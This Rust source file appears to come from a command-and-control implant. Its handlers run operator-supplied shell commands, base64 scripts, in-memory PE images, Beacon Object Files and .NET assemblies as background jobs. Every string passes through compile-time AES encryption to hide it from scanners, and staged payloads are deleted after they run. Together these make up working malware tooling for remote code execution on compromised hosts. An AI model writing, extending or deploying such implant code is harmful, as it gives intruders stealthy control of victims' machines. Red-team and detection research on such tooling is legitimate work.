// src/agent/handlers/execution.rs - In-memory execution, extensions, shell

use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

use crate::utils;
use crate::agent::inmem;
use crate::strcrypt_rt;
use strcrypt::aes_str;
use super::{HandlerContext, DispatchResult, AgentAction, lock_or_action};

// ── Background shell ───────────────────────────────────────────────────

pub(crate) fn handle_bg(ctx: &HandlerContext, shell_cmd: &str, req_id: u64) -> DispatchResult {
    let shell_cmd = shell_cmd.to_string();
    let desc = format!("{}: {}", aes_str!("shell"), &shell_cmd[..shell_cmd.len().min(60)]);
    let job_id = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).spawn(desc, req_id, move |sink| {
        async move {
            sink.send_chunk(&format!("{}: {}", aes_str!("[*] Running"), shell_cmd)).await;
            let (out, err, code) = tokio::task::spawn_blocking(move || {
                utils::execute_shell_command(&shell_cmd)
            }).await.unwrap_or_else(|_| (String::new(), aes_str!("Shell task panicked"), 1));
            if !out.is_empty() { sink.send_lines(&out).await; }
            (out, err, code)
        }
    });
    DispatchResult::Reply(format!("{} {} {}", aes_str!("Job"), job_id, aes_str!("started")), String::new(), 0, AgentAction::None)
}

// ── Explicit shell ─────────────────────────────────────────────────────

pub(crate) async fn handle_shell(shell_cmd: &str) -> DispatchResult {
    let shell_cmd = shell_cmd.to_string();
    let (o, e, c) = tokio::task::spawn_blocking(move || {
        utils::execute_shell_command(&shell_cmd)
    }).await.unwrap_or_else(|_| (String::new(), aes_str!("Shell task panicked"), 1));
    DispatchResult::Reply(o, e, c, AgentAction::None)
}

// ── Extensions ─────────────────────────────────────────────────────────

/// Shell-style tokenizer for command argument strings: splits on
/// whitespace but keeps double-quoted segments together (quotes stripped,
/// `\"` and `\\` escapes honored inside them). Plain split_whitespace
/// silently shredded args containing spaces, making them unusable.
pub fn split_shell_args(input: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_quotes = false;
    let mut chars = input.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '"' => in_quotes = !in_quotes,
            '\\' if in_quotes && matches!(chars.peek(), Some('"') | Some('\\')) => {
                cur.push(chars.next().expect("peeked"));
            }
            c if c.is_whitespace() && !in_quotes => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
            }
            c => cur.push(c),
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

pub(crate) fn handle_extension_bg(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
    let parts = split_shell_args(cmd);
    if parts.len() < 2 {
        return DispatchResult::Reply(String::new(), aes_str!("Invalid extension format"), 1, AgentAction::None);
    }

    let b64_str = parts[1].to_string();
    let script_args: Vec<String> = parts.iter().skip(2).map(|s| s.to_string()).collect();

    let script_bytes = match BASE64.decode(&b64_str) {
        Ok(b) => b,
        Err(_) => return DispatchResult::Reply(String::new(), aes_str!("Base64 Error"), 1, AgentAction::None),
    };
    let script = match String::from_utf8(script_bytes) {
        Ok(s) => s,
        Err(_) => return DispatchResult::Reply(String::new(), aes_str!("UTF8 Error"), 1, AgentAction::None),
    };

    let ext_mgr = ctx.ext_manager.clone();
    let desc = format!("{}: {}B {}", aes_str!("ext"), script.len(), aes_str!("script"));

    let job_id = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).spawn(desc, req_id, move |sink| {
        async move {
            sink.send_chunk(&aes_str!("[*] Extension starting...")).await;
            let result = tokio::task::spawn_blocking(move || {
                match ext_mgr.lock() {
                    Ok(mut mgr) => mgr.run_script(&script, script_args),
                    Err(_) => aes_str!("Error: extension manager lock poisoned"),
                }
            }).await.unwrap_or_else(|e| format!("{}: {}", aes_str!("Task Error"), e));
            sink.send_chunk(&result).await;
            (result, String::new(), 0)
        }
    });

    DispatchResult::Reply(format!("{} {}", aes_str!("Extension launched as Job"), job_id), String::new(), 0, AgentAction::None)
}

// ── In-Memory PE ───────────────────────────────────────────────────────

pub(crate) fn handle_load_pe(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
    let b64 = cmd.split_whitespace().nth(1).unwrap_or("");
    let pe_bytes = match BASE64.decode(b64) {
        Ok(b) => b,
        Err(_) => return DispatchResult::Reply(String::new(), aes_str!("Invalid base64"), 1, AgentAction::None),
    };

    let desc = format!("{} {}KB", aes_str!("inmem:pe"), pe_bytes.len() / 1024);
    let job_id = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).spawn(desc, req_id, move |sink| {
        async move {
            sink.send_chunk(&format!("{} ({} {})...", aes_str!("[*] Loading PE"), pe_bytes.len(), aes_str!("bytes"))).await;
            let result = tokio::task::spawn_blocking(move || {
                unsafe { inmem::pe_loader::load_pe(&pe_bytes) }
            }).await.unwrap_or_else(|e| Err(format!("{}: {}", aes_str!("Task Error"), e)));
            match result {
                Ok(msg) => { sink.send_chunk(&msg).await; (msg, String::new(), 0) }
                Err(e) => { sink.send_chunk(&format!("[-] {}", e)).await; (String::new(), e, 1) }
            }
        }
    });
    DispatchResult::Reply(format!("{} {}", aes_str!("PE load launched as Job"), job_id), String::new(), 0, AgentAction::None)
}

// ── In-Memory BOF ──────────────────────────────────────────────────────

pub(crate) fn handle_run_bof(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() < 2 {
        return DispatchResult::Reply(String::new(), aes_str!("Usage: inmem:bof <b64_coff> [b64_args]"), 1, AgentAction::None);
    }
    let coff_bytes = match BASE64.decode(parts[1]) {
        Ok(b) => b,
        Err(_) => return DispatchResult::Reply(String::new(), aes_str!("Invalid COFF base64"), 1, AgentAction::None),
    };
    let args_bytes = if parts.len() > 2 { BASE64.decode(parts[2]).unwrap_or_default() } else { Vec::new() };

    let desc = format!("{} {}KB", aes_str!("inmem:bof"), coff_bytes.len() / 1024);
    let job_id = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).spawn(desc, req_id, move |sink| {
        async move {
            sink.send_chunk(&format!("{} ({} {})...", aes_str!("[*] Running BOF"), coff_bytes.len(), aes_str!("bytes"))).await;
            let result = tokio::task::spawn_blocking(move || {
                unsafe { inmem::bof::run_bof(&coff_bytes, &args_bytes) }
            }).await.unwrap_or_else(|e| Err(format!("{}: {}", aes_str!("Task Error"), e)));
            match result {
                Ok(msg) => { sink.send_chunk(&msg).await; (msg, String::new(), 0) }
                Err(e) => { sink.send_chunk(&format!("[-] {}", e)).await; (String::new(), e, 1) }
            }
        }
    });
    DispatchResult::Reply(format!("{} {}", aes_str!("BOF launched as Job"), job_id), String::new(), 0, AgentAction::None)
}

// ── .NET Assembly ──────────────────────────────────────────────────────

/// Stage an inline b64 assembly payload for the CLR hosting API, which is
/// path-based: decode into a randomized temp file that run_assembly loads
/// and that the caller removes afterwards. Returns the staged path.
fn stage_dotnet_payload(b64: &str) -> Result<String, String> {
    let bytes = BASE64.decode(b64.trim())
        .map_err(|e| format!("{}: {}", aes_str!("b64 decode failed"), e))?;
    if bytes.is_empty() {
        return Err(aes_str!("b64 payload is empty"));
    }
    let name = format!("{}{:016x}.dll", aes_str!("rcm_dn_"), rand::random::<u64>());
    let path = std::env::temp_dir().join(name);
    std::fs::write(&path, &bytes)
        .map_err(|e| format!("{}: {}", aes_str!("temp stage failed"), e))?;
    Ok(path.to_string_lossy().into_owned())
}

pub fn handle_run_dotnet(cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.splitn(6, ' ').collect();
    if parts.len() < 5 {
        return (String::new(), aes_str!("Usage: inmem:dotnet <path|b64:payload> <Type> <Method> <arg> [runtime]"), 1);
    }
    let runtime = if parts.len() > 5 { parts[5].to_string() } else { aes_str!("v4.0.30319") };

    // The assembly normally travels as an inline b64 payload (no pre-staged
    // file on the target). It is staged to a randomized temp file because
    // the CLR hosting API is path-based, and removed after execution. A
    // pre-staged filesystem path still works for backward compatibility.
    let staged = match parts[1].strip_prefix(aes_str!("b64:").as_str()) {
        Some(b64) => match stage_dotnet_payload(b64) {
            Ok(p) => Some(p),
            Err(e) => return (String::new(), e, 1),
        },
        None => None,
    };
    let path = staged.as_deref().unwrap_or(parts[1]);

    let result = unsafe { inmem::dotnet::run_assembly(path, parts[2], parts[3], parts[4], &runtime) };
    if let Some(p) = &staged {
        let _ = std::fs::remove_file(p);
    }
    match result {
        Ok(msg) => (msg, String::new(), 0),
        Err(e) => (String::new(), e, 1),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn stage_dotnet_payload_writes_randomized_temp_file() {
        let b64 = BASE64.encode(b"\x4d\x5a fake assembly bytes");
        let p1 = stage_dotnet_payload(&b64).expect("staging must succeed");
        let p2 = stage_dotnet_payload(&b64).expect("staging must succeed");
        // Randomized names: two stagings never collide.
        assert_ne!(p1, p2);
        let bytes = std::fs::read(&p1).expect("staged file readable");
        assert_eq!(bytes, b"\x4d\x5a fake assembly bytes");
        assert!(p1.ends_with(".dll"));
        let _ = std::fs::remove_file(&p1);
        let _ = std::fs::remove_file(&p2);
    }

    #[test]
    fn stage_dotnet_payload_rejects_garbage() {
        assert!(stage_dotnet_payload("!!! not base64 !!!").is_err());
        assert!(stage_dotnet_payload(&BASE64.encode(b"")).is_err());
    }

    #[test]
    fn dotnet_b64_prefix_detection() {
        // The handler splits on the b64: prefix; a plain path stays untouched.
        assert!("b64:QUJD".strip_prefix("b64:").is_some());
        assert!("/tmp/x.dll".strip_prefix("b64:").is_none());
    }

    #[tokio::test]
    async fn shell_echo() {
        match handle_shell("echo hello").await {
            DispatchResult::Reply(out, _, 0, _) => {
                assert!(out.contains("hello"), "Expected 'hello' in output, got: {}", out);
            }
            DispatchResult::Reply(_, err, code, _) => {
                panic!("Shell failed with code {}: {}", code, err);
            }
            _ => panic!("Expected Reply"),
        }
    }

    #[tokio::test]
    async fn shell_bad_command() {
        match handle_shell("nonexistent_command_12345").await {
            DispatchResult::Reply(_, _, code, _) => {
                assert_ne!(code, 0, "Nonexistent command should fail");
            }
            _ => panic!("Expected Reply"),
        }
    }
}